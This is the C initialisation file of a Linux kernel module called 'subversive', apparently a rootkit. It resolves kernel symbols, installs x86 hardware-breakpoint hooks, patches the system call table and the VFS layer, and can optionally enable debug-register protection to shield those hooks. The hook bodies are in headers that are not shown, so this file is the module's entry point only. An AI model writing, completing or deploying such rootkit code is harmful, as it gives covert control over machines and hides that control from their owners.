#include <linux/kernel.h>
#include <linux/module.h>

#include <subversive/config.h>
#include <subversive/ksyms.h>
#include <subversive/syscalls.h>
#include <subversive/vfs.h>
#include <subversive/x86.h>

MODULE_LICENSE("GPL");

static int __init subversive_init(void)
{
	int ret;

	pr_debug("%s: init\n", __func__);

	/* MUST be called first */
	ret = get_kernel_syms();
	if (ret)
		return 0;

	ret = x86_hw_breakpoint_init();
	if (ret < 0)
		return 0;

	hook_sys_call_table();
	vfs_hook();

	if (CONFIG_DR_PROTECT)
		x86_hw_breakpoint_protect_enable();

	return 0;
}

static void __exit subversive_exit(void)
{
	pr_debug("%s: exit\n", __func__);

	if (CONFIG_DR_PROTECT)
		x86_hw_breakpoint_protect_disable();

	x86_hw_breakpoint_exit();
}

module_init(subversive_init);
module_exit(subversive_exit);
